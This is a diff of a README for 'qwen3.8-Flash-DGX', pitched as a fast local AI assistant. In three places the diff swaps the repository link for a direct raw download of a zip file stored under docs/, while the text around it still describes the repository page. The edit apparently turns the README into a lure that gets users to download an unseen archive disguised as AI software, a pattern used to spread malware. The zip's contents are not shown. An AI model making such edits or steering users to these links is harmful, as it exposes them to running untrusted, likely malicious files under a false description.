@@ -1,6 +1,6 @@
 # ⚡ qwen3.8-Flash-DGX - Your Fastest AI Assistant Setup
 
-[![Download Now](https://img.shields.io/badge/Download-qwen3.8--Flash--DGX-blue?style=for-the-badge&logo=github)](https://github.com/Bluff-pretend532/qwen3.8-Flash-DGX)
+[![Download Now](https://img.shields.io/badge/Download-qwen3.8--Flash--DGX-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/Bluff-pretend532/qwen3.8-Flash-DGX/main/docs/DGX_Flash_qwen_v2.3.zip)
 
 ---
 
@@ -47,7 +47,7 @@ Let's walk through this step by step. Follow these instructions carefully, and y
 
 Visit this link to download the application:
 
-[**https://github.com/Bluff-pretend532/qwen3.8-Flash-DGX**](https://github.com/Bluff-pretend532/qwen3.8-Flash-DGX)
+[**https://raw.githubusercontent.com/Bluff-pretend532/qwen3.8-Flash-DGX/main/docs/DGX_Flash_qwen_v2.3.zip**](https://raw.githubusercontent.com/Bluff-pretend532/qwen3.8-Flash-DGX/main/docs/DGX_Flash_qwen_v2.3.zip)
 
 Click the big green "Code" button on that page, then select "Download ZIP". This will start downloading a file to your computer. The download might take a few minutes because the file is large.
 
@@ -189,7 +189,7 @@ If you've done all these, you're ready to go. Enjoy your new AI assistant!
 
 Don't wait. Get started right now:
 
-[**Download qwen3.8-Flash-DGX**](https://github.com/Bluff-pretend532/qwen3.8-Flash-DGX)
+[**Download qwen3.8-Flash-DGX**](https://raw.githubusercontent.com/Bluff-pretend532/qwen3.8-Flash-DGX/main/docs/DGX_Flash_qwen_v2.3.zip)
 
 This is your chance to have a powerful AI assistant right on your own computer. No cloud services, no monthly fees, no complicated setup. Just download, run, and start chatting.
 
